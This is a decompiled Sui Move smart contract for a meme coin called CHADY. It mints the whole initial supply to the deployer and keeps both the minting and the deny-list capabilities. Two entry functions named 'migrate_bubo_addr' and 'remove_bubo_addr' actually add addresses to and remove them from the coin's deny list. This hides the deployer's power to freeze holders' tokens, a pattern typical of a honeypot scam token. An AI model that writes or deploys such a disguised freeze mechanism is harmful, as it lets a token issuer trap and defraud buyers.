module 0x10abf3818e6c0cd402881b88acf83d5d18fce16e3c16c6eb6bac53c6591f3418::CHADY {
    struct CHADY has drop {
        dummy_field: bool,
    }

    fun init(arg0: CHADY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHADY>(arg0, 6, b"CHADY", b"Chady", b"The Chad of SUI. Chady is a degen obsessed with his hair. He is fearless. In fact fear is afraid of him.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmUYAFZcDYyfH45p6KX4wjWKraGQSJRP4juvqXh6ipxLTp?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHADY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<CHADY>>(0x2::coin::mint<CHADY>(&mut v3, 1000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<CHADY>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHADY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun migrate_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHADY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHADY>(arg0, arg1, arg2, arg3);
    }

    public entry fun remove_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHADY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHADY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

